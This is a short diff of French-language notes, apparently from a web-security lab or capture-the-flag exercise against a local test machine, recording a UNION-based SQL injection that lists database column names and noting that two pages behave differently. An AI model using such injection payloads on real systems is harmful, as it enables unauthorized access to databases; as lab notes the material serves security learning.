@@ -43,4 +43,6 @@ USER_STATISTICS
 
 ## 0 UNION ALL SELECT NULL,concat(column_name) FROM guestbook.COLUMNS --
 me donne toute les columns existante
-
+visiblement http://192.168.56.101/index.php?page=member
+et http://192.168.56.101/index.php?page=searchimg
+n on pas le meme fonctionnement
